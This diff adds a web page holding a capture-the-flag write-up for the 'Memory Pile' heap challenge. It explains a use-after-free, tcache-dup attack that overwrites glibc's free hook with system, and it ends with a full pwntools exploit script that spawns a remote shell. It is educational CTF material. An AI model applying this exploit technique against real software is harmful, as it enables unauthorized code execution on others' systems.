@@ -1,0 +1,117 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Memory Pile 300pts</h1>
+            <h2>July 2021</h2>
+            <h4>TcacheDup</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    Memory leaks can be fun, but do you know what's even more fun? Heap exploits! <a href=../../docs/imaginary/memory_pile>memory_pile</a>
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit. We also get a libc and linker file, so before starting the challenge we have to link the binary to the custom libc. 
+        <br>
+    	The challenge was a fairly straightforward heapnote. The main function gives us a libc leak and three options: acquire, release and fill. These pretty much equate to malloc, free & edit. Fortunately for us, these functions are riddled with vulnerabilities. We can double free and continue writing to a chunk after freeing it. There are multiple different ways to exploit this. I decided to just perform a simple tcache-dup using the given write after free bug. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/pile1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+        <br><br>
+        A tcache dup attack relies on using some bug to overwrite a free'd tchache chunks fd pointer with an address of the attackers choosing. Since chunks are allocated from the tcache when possible, the heap allocator will try to allocate a chunk at the address we overwrite the bins fd with. This gives us a write what where vulnerability that can bed used to overwrite the free hook with the address of system and spawn a shell. Furthermore, there are no size checks when allocating from the tache, and since we are just using a uaf bug we don't have to worry about double free protections either.     
+        <br><br>
+    </p>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        We will start off by allocating a chunk and then immediately free it. Next we will use the write after free bug to overwrite the fd pointer of this chunk with the address of the free hook. This results in the free hook being inserted into the tcache list. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/pile2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After making an allocation to empty out the tcachebin, the next allocation will allocate a chunk at the free hook. Now we can easily call the edit function with the index of this chunk, and overwrite the free hook with the address of system. Now whenever we call free(), system() is also called. This means that if we save '/bin/sh\0' into a chunk, and free this chunk, we would be calling system('/bin/sh'), resulting in a shell and the flag.
+         <br><br>
+        The entire exploit script is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/pile3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+p = remote('chal.imaginaryctf.org',42007)
+
+#====================Healper_Functions=============================#
+
+def malloc(index):
+    p.sendline('1')
+    p.sendline(f"{index}")
+
+def free(index):
+    p.sendline('2')
+    p.sendline(f"{index}")
+
+def edit(index, value):
+    p.sendline('3')
+    p.sendline(f"{index}")
+    p.sendline(value)
+
+#==========================Exploit==================================#
+
+p.recvuntil('...\n')
+data = p.recvline().strip()
+libc.address = int(data,16) - libc.sym['printf']
+print("[+] Libc Address: " + hex(libc.address))
+
+malloc(0)
+free(0)
+edit(0,p64(libc.sym.__free_hook))   #UAF to overwrite tcachebin fd
+malloc(1)
+malloc(2)
+edit(2,p64(libc.sym.system))        #Write system() into free hook
+edit(0,b'/bin/sh\0')
+free(0)                             #System('/bin/sh')
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
